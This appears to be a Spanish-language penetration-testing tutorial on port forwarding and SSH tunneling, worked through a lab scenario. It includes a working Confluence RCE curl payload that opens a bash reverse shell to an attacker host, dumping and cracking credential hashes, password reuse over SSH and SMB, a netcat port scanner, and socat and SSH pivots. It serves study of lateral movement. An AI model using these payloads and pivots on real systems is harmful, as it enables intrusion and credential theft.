---
layout: post
title: Port Forwarding
subtitle: Port Forwarding Basics.
tags: [pen]
---
### 1. Port Redirection and Tunneling.

**Segmented Networks. Firewalls.**

Una Network o Red es un conjunto de ordenadores conectados entre sí, es decir, que pueden comunicarse entre ellos. Atendiendo a la topología podemos diferenciar dos tipos de redes:

- *Flat Networks*: Cuando todos las máquinas de una red se pueden comunicar entre sí directamente. Cada una de ellas tiene comunicación directa con cualquier otra.
- *Segmented Networks*: Cuando la red está divida en subredes que tienen un propósito concreto con un Gateaway que hace el rol de intermediario entre el interior de la subnet y el resto de la red.

Por motivos obvios, las redes planas no son seguras, restringir (y por tanto regular a través de tecnologías como IDS, IPS, firewalls, etc) las comunicaciones entre las máquinas limita la superficie de ataque.

Una de las tecnologías más comunes utilizadas para esto son los Firewalls. Los firewall se pueden implementar a nivel de software end-point. Por ejemplo, el kernel de Linux tiene capacidades de firewall que se pueden configurar con el conjunto de herramientas iptables, mientras que Windows ofrece el Firewall de Windows Defender incorporado. Aunque también se pueden implementar como características dentro de una parte de la infraestructura de red física. Los administradores pueden incluso colocar un firewall de hardware
independiente en la red, filtrando todo el tráfico.

Los firewalls pueden descartar paquetes entrantes no deseados y evitar que el tráfico potencialmente malicioso atraviese o abandone la red. Los firewalls pueden impedir que todos los hosts permitidos, excepto unos pocos, se comuniquen con un puerto en un servidor particularmente privilegiado. También pueden bloquear el acceso de algunos hosts o subredes a Internet en general .

La mayoría de los firewalls tienden a permitir o bloquear el tráfico de acuerdo con un conjunto de reglas basadas en direcciones IP y números de puerto, por lo que su funcionalidad es limitada. Sin embargo, a veces se requiere un control más detallado. *Deep Packet Inspectio* monitorea el contenido del tráfico entrante y saliente y lo finaliza según un conjunto de reglas.

Los límites establecidos por los administradores de red están diseñados para **evitar el movimiento arbitrario de datos dentro, fuera y a través de la red**. Pero, como atacante, estos son exactamente los límites que debemos atravesar. Tendremos que desarrollar estrategias que puedan ayudarnos a sortear las restricciones de red a medida que las encontremos.

<br />

**Port Forwarding & Tunneling**

Así, para sortear estas medidas de seguridad aparecen los conceptos de *Port Forwarding* y *Tunneling*. 

La redirección de puertos (un término que usamos para describir varios tipos de reenvío de puertos) y la tunelización son estrategias que podemos usar para atravesar estos límites. La redirección de puertos significa modificar el flujo de datos para que los paquetes enviados a un socket se tomen y pasen a otro socket. La tunelización significa encapsular un tipo de flujo de datos dentro de otro, por ejemplo, transportar el tráfico HTTP dentro de una conexión SSH (por lo que desde una perspectiva externa, solo el tráfico SSH será visible).

<br />

### 2. Port Forwading with Linux Tools.

El Port Forwarding es la técnica más fundamental que examinaremos en este Módulo. También es una técnica que se usa muy comúnmente en redes de propósito general. Al reenviar información sobre puertos, configuramos un host para escuchar en un puerto y retransmitir todos los paquetes recibidos en ese puerto a otro puerto sobre otro destino.

En condiciones normales de red, un administrador de red puede crear un reenvío de puerto para permitir el acceso a un servidor web detrás de un firewall. En ese caso, configurarían el firewall para escuchar en un puerto determinado en una interfaz y redirigir todos los paquetes al servidor web detrás de él.

Muchos *routers* domésticos también brindan la funcionalidad de reenvío de puertos. Estos pueden configurarse para escuchar en un puerto en el lado del enrutador orientado a Internet y luego reenviar las conexiones desde ese puerto a otro dispositivo dentro de la red doméstica.

<br />

#### 2.1. Simple Port Forwarding Scenario.


**Enumeración del entorno.**

Supongámos que hemos ganado acceso RCE a un servidor mediante el siguiente exploit:

```
curl -v http://192.168.214.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.204/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

Asociado al CVE-2022-23134. Y comprobamos sus interfaces de red. Encontramos que posee dos interfaces de red. 

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

Es decir, esta máquina mantiene contacto simultáneo con dos redes de ordenadores separadas; la WAN de la que nuestra red forma parte y una LAN que problabemente tendrá algún nombre particular.

Una WAN es una red grande y expansiva. Algunas personas se refieren a Internet pública como la WAN más grande del mundo, y algunas organizaciones más grandes se refieren a su gran red interna como WAN o WAN interna. En este ca so, dado que estamos simulando un ataque desde una red externa, la WAN representa una gran red interna corporativa o la propia Internet. Nuestra máquina Kali estará situada en la WAN. Solo podremos enrutar directamente desde nuestra máquina Kali a hosts que también estén en la WAN.

Un tipo de red interna conocida es una DMZ. Una DMZ es una red que contiene dispositivos que pueden estar más expuestos a una red más amplia y menos confiable. Una DMZ ayuda a crear una zona de amortiguamiento entre los hosts en la red más amplia y menos confiable y los hosts internos. De esta forma, cumple una función similar a la de una zona desmilitarizada del mundo real . 6 En este escenario, la DMZ es el segmento de red de amortiguamiento entre la WAN y cualquier otra red interna que podamos encontrar.

Continuando con la investigación de la máquina, ahora que sabemos que esta tiene un pie en dos redes, merece la pena investigar las tablas de enrutamiento (route table) para conocer con más detalle la comuicación de la máquina con la red interna.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

Observamos que expone ambas redes así como las máscaras de red pero no expone ningún enrutamiento a un hosts concreto.

Por suerte, encontramos un documento en el que aparece un host interno junto con credenciales:

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

Encontraremos la dirección IP del servidor de la base de datos, así como el nombre de usuario y la contraseña de texto sin formato utilizados para conectarse a él. Podemos usar estas credenciales para autenticarnos en la base de datos y continuar nuestra enumeración.

Sin embargo, hemos llegado a una limitación. CONFLUENCE01 no tiene instalado un cliente PostgreSQL. Dado que nos estamos ejecutando como el usuario de CONFLUENCE01 de privilegios bajos , tampoco podemos instalar fácilmente el software.

Tenemos el cliente _psql_ de PostgreSQL instalado en nuestra máquina Kali, pero no podemos conectarnos directamente a PGDATABASE01 desde nuestra máquina Kali, ya que esta sólo es accesoble desde CONFLUENCE01 _._

En este escenario, no existe un firewall entre nuestra máquina Kali y CONFLUENCE01, lo que significa que no hay nada que nos impida vincular puertos en la interfaz WAN de CONFLUENCE01 y conectarnos a ellos desde nuestra máquina Kali.

Este es exactamente el tipo de situación en la que el Port Forwarding puede ser útil. Podemos crear una redirección de paquetes en CONFLUENCE01 que escuche en un puerto en la interfaz WAN, luego reenviar todos los paquetes recibidos en este puerto a PGDATABASE01 en la subred interna. 

<br />

**Port Forwarding with Socat**

Ahora que tenemos unas credenciales (que vamos a asumir como validas), tenemos una forma de penetración sobre la máquina PGDATABASE01, vamos a configurar CONFLUENCE01 para redirigir tráfico proveniente de nuestra kali sobre la PGDATABASE01. 

Para este fin vamos a emplear Socat, si no está instalado por defecto en CONFLUENCE01 lo transportamos desde la Kali, es importante recordar que necesitamos un binario estático de otra manera se requerirían librerias que podrían no encontrarse en la máquina de destino.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

En CONFLUENCE01, iniciaremos un proceso Socat detallado (**-ddd**). Escuchará en el puerto TCP 2345 (**TCP-LISTEN:2345**), se bifurcará en un nuevo subproceso cuando reciba una conexión (**fork**) en lugar de morir después de una sola conexión, luego reenviará todo el tráfico que reciba al puerto TCP 5432 en PGDATABASE01 (**TCP :10.4.50.215:5432**).

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230602121300.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, nos conectamos al servicio postgresql a la CONFLUENCE01 sobre el puerto de redirección:

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
 
```

De esta forma, nos concectamos a la base de datos y la exploramos, obteniendo unas credenciales:

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

<br />

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

de solo unos minutos de descifrado, Hashcat devuelve las contraseñas para los usuarios _de database_admin_ , _hr_admin_ y _rdp_admin ._

Podríamos sospechar que estas contraseñas se reutilizan en otros lugares de la red. Después de enumerar un poco más la red interna, encontraremos que PGDATABASE01 también ejecuta un servidor SSH. Probemos estas credenciales contra este servidor SSH. Con nuestra nueva habilidad de reenvío de puertos, podemos crear un reenvío de puertos en CONFLUENCE01 que nos permitirá SSH directamente desde nuestra máquina Kali a PGDATABASE01.

Primero, debemos eliminar el proceso Socat original que escucha en el puerto TCP 2345. Luego, crearemos un nuevo reenvío de puerto con Socat que escuchará en el puerto TCP 2222 y reenviará al puerto TCP 22 en PGDATABASE01.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```


<br />

### 3. SSH Tunneling.

A medida que los datos viajan a través de una red sufren un proceso de encapsulación de datos que se realiza siguiendo un modelo abstracto de capas de protocolos de red denominado TCP/IP.

En cada capa se configura un monto de información en forma de paquete (que tiene diferentes nombres en función de la capa a la que este pertenezca; segmento TCP, Datagrama, etc) que a su vez contiene los paquetes de información de las capas subyacentes.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230606115405.png' | relative_url }}" text-align="center"/>
</div>

En el mismo sentido, el *Tunneling* describe el acto de encapsular datos de un protocolo de la capa de aplicación dentro de paquetes correspondientes a otro protocolo de la capa de aplicación mientras viaja a través de una red. Un ejemplo clásico es el tunneling SSH que consiste en introducir un paquete, por ejemplo HTTP, dentro de un paquete SSH de forma que externamente, un firewall o un IDS, percibiría tráfico SSH (más fácilmente tolerado por firewalls u otras medidas de seguridad):

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230606121406.png' | relative_url }}" text-align="center"/>
</div>

Se dice que SSH es un Tunneling Protocol.

El protocolo SSH es principalmente un protocolo de tunelización, por lo que es posible transportar casi cualquier tipo de datos a través de una conexión SSH. Por esa razón, las capacidades de tunelización están integradas en la mayoría de los comandos SSH. Además, es común encontrar software de cliente SSH ya instalado en hosts Linux, o _OpenSSH_ instalado en hosts Windows. En entornos de red que no están fuertemente monitoreados, el tráfico SSH no parecerá anómalo y el tráfico SSH se parecerá mucho al tráfico administrativo regular. Su contenido tampoco puede ser monitoreado fácilmente.

Esencialmente distinguimos SSH Local Port Forwafing y el SSH Remote Port Forwarding. La diferencia entre ambas estriba en la posición del túnel SSH respecto de la LAN que estamos asaltando. Desde la perspectiva de la red, cualquier movimiento dentro de la misma se considera un movimiento local, de ahí que el SSH Local Port Forwarding sea el caso en el que túnel SSH se encuentre establecido entre dos hosts de la misma LAN mientras que el SSH Remote Port Forwarding sea cuando el SSH túnel se establece entre dos hosts posicionados en redes distintas, frecuentemente uno en la WAN y otro en la LAN.

<br />

#### 3.1. SSH Local Port Forwarding.

Para exponer el siguiente caso de SSH Local Tunneling vamos a seguir con el caso expuesto anteriormente, hasta el momento teníamos 3 máquinas; nuestra Kali en la WAN, CONFLUENCE01 en WAN y DMZ (DeMilitarizatedZone) y PGDATABASE01 en DMZ.

Con el SSH local port forwarding se utiliza una conexión SSH entre un cliente SSH que recibe paquetes que son enviados a un servidor SSH a lo largo de un túnel SSH como hemos explicado anteriormente y de ahí son redirigidos sobre otro puerto ya sea local como en el ejemplo expuesto del tunneling anteriormente o remoto como en este:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230606180852.png' | relative_url }}" text-align="center"/>
</div>

Así, volviendo sobre un caso explícito, supongámos que estámos conectados con SSH a PGDATABASE01, el punto en el que dejamos el anterior caso. Enumeramos las interfaces de red y descubrimos que a su vez, PGDATABASE01 forma parte de otra red interna:

```
database_admin@pgdatabase01:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ba:30:fb brd ff:ff:ff:ff:ff:ff
    inet 10.4.206.215/24 brd 10.4.206.255 scope global ens192
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ba:e0:d1 brd ff:ff:ff:ff:ff:ff
    inet 172.16.206.254/24 brd 172.16.206.255 scope global ens224
       valid_lft forever preferred_lft forever
```

La route table confirma este hallazgo exponiendo rutas de paquetes sobre dicha red:

```
database_admin@pgdatabase01:~$ ip route
10.4.50.0/24 dev ens192 proto kernel scope link src 10.4.50.215 
10.4.50.0/24 via 10.4.50.254 dev ens192 proto static
172.16.50.0/24 dev ens224 proto kernel scope link src 172.16.50.215 
172.16.50.0/24 via 172.16.50.254 dev ens224 proto static
```

Como no encontramos ninguna credencial ni ningún hallazgo sobre otra máquina específica en la nueva red adicional vamos a realizar un escaneo de red manual:

```
database_admin@pgdatabase01:~$ for i in $(seq 1 254); do ping -c1 172.16.206.$i| grep "1 received" -C4; done
PING 172.16.206.217 (172.16.206.217) 56(84) bytes of data.
64 bytes from 172.16.206.217: icmp_seq=1 ttl=128 time=0.298 ms

--- 172.16.206.217 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.298/0.298/0.298/0.000 ms
PING 172.16.206.254 (172.16.206.254) 56(84) bytes of data.
64 bytes from 172.16.206.254: icmp_seq=1 ttl=64 time=0.017 ms

--- 172.16.206.254 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
```

Escaneamos la red y comprobamos que dentro de la segunda red existe al menos un segundo hosts:

```
database_admin@pgdatabase01:~$ for i in $(seq 200 254); do ping -c1 172.16.237.$i| grep "1 received" -C4; done
PING 172.16.237.217 (172.16.237.217) 56(84) bytes of data.
64 bytes from 172.16.237.217: icmp_seq=1 ttl=128 time=0.338 ms

--- 172.16.237.217 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.338/0.338/0.338/0.000 ms
PING 172.16.237.254 (172.16.237.254) 56(84) bytes of data.
64 bytes from 172.16.237.254: icmp_seq=1 ttl=64 time=0.026 ms

--- 172.16.237.254 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.026/0.026/0.026/0.000 ms
```

Seguidamente, realizamos un escaneo de puertos sobre el la máquina encontrada con el siguiente script:

```
#!/bin/bash

#Usage: ./NetcatScanner <IP> <ThreadNumber> <Ports>; ./NetcatScanner 10.10.10.10 10 10000. !!!It is worth to mention that <Ports>/<ThreadNumber> must be an integer, otherwise the script triggers an error.!!!

#This script attemps to use netcat tool in order to perform a multi-process netcat port scanner. First, we create several bash scripts which scan a range of ports by them selves and then we execute them at the same time with a loop in background.

mkdir /tmp/PortScan

mkdir /tmp/OutScan

cd /tmp/PortScan

PortRange=$(($3/$2)) 

content=$(echo "for port in \$(seq 1 $PortRange);do nc -zv -w 1 $1 \$((\$port+YY*$PortRange)) &>> /tmp/OutScan/ncOutYY.txt;done;cat /tmp/OutScan/ncOutYY.txt | grep 'Connection to'>/tmp/OutScan/OpenPortsYY.txt;rm /tmp/OutScan/ncOutYY.txt" | base64 | tr -d '\n') #We encode the scanner code.

for i in $(seq 0 $(($2-1))) #The numbers of threads. Standard is 9; 10 threads.
do 
        echo $content | base64 -d > nc$i.sh #We decode the scanner program and copy it through several files.
done

for file in $(ls);do n=$(echo $file | cut -d "." -f1 | grep '[0-9]' | tr -d 'nc');sed "s/YY/$n/g" -i $file;done

for file in $(ls /tmp/PortScan) #We launch the scanners in the background to achieve simultaenous execution of the scripts.
do
        chmod +x $file
        ./$file &
	echo "[+] Launched $file"
done


echo -e "\n[+] Scanner launched. Check progress at 'progress=\$(tail -n1 /tmp/OutScan/ncOut0.txt | cut -d ' ' -f6 | grep '[0-9]');echo \"[+] \$progress from $PortRange\"'."
echo -e "\n[+] When finish: 'cat /tmp/OutScan/OpenPorts*'."
```

Damos permisos de ejecución y lo lanzamos:

```
database_admin@pgdatabase01:/tmp$ ./script.sh 172.16.237.217 100 10000
[+] Launched nc0.sh
[+] Launched nc10.sh
[...]
[+] Launched nc98.sh
[+] Launched nc99.sh
[+] Launched nc9.sh

[+] Scanner launched. Check progress at 'progress=$(tail -n1 /tmp/OutScan/ncOut0.txt | cut -d ' ' -f6 | grep '[0-9]');echo "[+] $progress from 100"'.

[+] When finish: 'cat /tmp/OutScan/OpenPorts*'.
database_admin@pgdatabase01:/tmp$ cat /tmp/OutScan/OpenPorts*
Connection to 172.16.237.217 135 port [tcp/epmap] succeeded!
Connection to 172.16.237.217 139 port [tcp/netbios-ssn] succeeded!
Connection to 172.16.237.217 3389 port [tcp/ms-wbt-server] succeeded!
Connection to 172.16.237.217 445 port [tcp/microsoft-ds] succeeded!
```

Podemos observar que entre los puertos descubiertos hay un servidor SMB (puerto 139, 445), la distribución de servicios sugiere altamente que se trata de un Windows Server. 

Para interaccionar con este complejo servicio, necesitamos herramientas específicas. Probablemente podamos descubrir algo interesante ya que los servicios y máquinas internas de subredes, al estar protegidos por la propia topología de red, suelen contar con menos medidas de seguridad.

De esta forma, utilizamos SSH para crear un túnel SSH que redirija información desde nuestra kali hacia el nuevo host a través de un túnel SSH:

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.237.217:445 database_admin@10.4.237.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.237.215 (10.4.237.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.237.215's password: 
```

El comando anterior provoca que CONFLUENCE01 escuche sobre el puerto local 4455 en cualquier interfaz de red y reenvié el tráfico sobre el puerto 445 de 172.16.237.217 a través de la máquina PGDATABASE01 y el usuario database_admin.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230607214725.png' | relative_url }}" text-align="center"/>
</div>

Ahora, desde la kali, lanzamos smbclient hacia el puerto 4455 de la CONFLUENCE01:

```
kali@kali:~$ smbclient -p 4455 -L //192.168.237.63/ -U hr_admin --password=Welcome1234

        Sharename       Type      Commen
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.237.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

Hasta aquí hemos visto que con el SSH Local Port Forwarding podemos utilizar un servicio SSH para transportar paquetes desde un cliente SSH hasta un servidor SSH y desde ahí utilizar un usuario para redirigir los paquetes sobre otra máquina.

<br />


#### 3.2. SSH Local Dynamic Port Forwarding. Proxychains.

El SSH Local Port Forwarding es una herramienta útil en un contexto de enumeración y explotación de redes internas. Sin embargo, posee una limitación, el número de sockets a los que acceder. Cada vez que queramos acceder a un puerto distinto debemos reiniciar la conexión para cambiar de socket.

Afortunadamente, OpenSSH también provee de dynamic port forwarding. Este método tiene la capacidad, desde un único puerto en el cliente SSH, de dirigirse sobre cualquier socket accesible por el servidor SSH:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230608115055.png' | relative_url }}" text-align="center"/>
</div>

Suponiendo de nuevo el contexto del ejemplo anterior, el comando para desencadenar un *dinamic port forwarding* sería:

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
<$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215   
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.50.215's password:
```

Podemos asegurarnos de que estamos en un shell TTY usando el módulo _pty_ de Python3 . Crearemos nuestra conexión SSH a PGDATABASE01 usando las credenciales de *database_admin* nuevamente. En OpenSSH, se crea un *Dynamic Port Forwarding* con la opción -D. El único argumento que esto toma es la dirección IP y el puerto al que queremos vincularnos. En este caso, queremos que escuche en todas las interfaces de red del puerto *9999*. No tenemos que especificar una dirección de socket para reenviar. También pasaremos el indicador **-N** para evitar que se genere una shell.

